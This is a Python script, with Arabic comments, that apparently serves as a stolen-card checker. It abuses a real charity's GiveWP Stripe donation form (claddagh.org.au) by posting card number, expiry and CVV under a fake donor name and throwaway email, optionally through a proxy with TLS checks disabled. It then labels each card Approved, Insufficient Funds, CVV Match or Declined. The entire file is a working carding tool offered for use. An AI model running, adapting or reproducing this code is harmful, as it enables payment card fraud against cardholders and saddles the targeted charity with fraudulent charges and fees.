"""
بوابة الدفع: Stripe Charge Single
الموقع: claddagh.org.au
نوع البوابة: Stripe Charge (GiveWP)
تدفق الطلبات:
1. GET /donations/donate-now/ -> تهيئة الجلسة
2. POST /wp-admin/admin-ajax.php (give_process_donation) -> إرسال بيانات البطاقة وتصنيف النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl


async def req1_init_session(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> None:
    """الخطوة 1: تهيئة الجلسة عبر زيارة صفحة التبرع."""
    headers = {
        "authority": "claddagh.org.au",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    }
    try:
        async with session.get(
            "https://claddagh.org.au/donations/donate-now/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            await r.text()
    except Exception as e:
        raise RuntimeError(f"req1_init_session failed: {e}") from e


async def req2_process_donation(
    session: aiohttp.ClientSession,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: إرسال طلب التبرع عبر GiveWP Stripe."""
    data = {
        "action": "give_process_donation",
        "give-form-id": "718",
        "give-gateway": "stripe",
        "give-card-number": cc,
        "give-card-cvc": cvv,
        "give-card-expiration": f"{mes} / {ano}",
        "give-first": "John",
        "give-last": "Doe",
        "give-email": f"test{uuid.uuid4().hex[:6]}@gmail.com",
    }
    try:
        async with session.post(
            "https://claddagh.org.au/wp-admin/admin-ajax.php",
            data=data,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req2_process_donation failed: {e}") from e


async def process_ST_single_charge(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Stripe Charge Single (GiveWP)."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            await req1_init_session(session, proxy_url)
            response_text = await req2_process_donation(session, cc, mes, ano, cvv, proxy_url)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"
    rt_lower = response_text.lower()
    if "success" in rt_lower or "thank you" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Approved"
    elif "insufficient funds" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Insufficient Funds"
    elif "incorrect_cvc" in rt_lower or "cvv" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "CCN/CVV Match"
    elif "declined" in rt_lower:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined"
    else:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Transaction Failed"
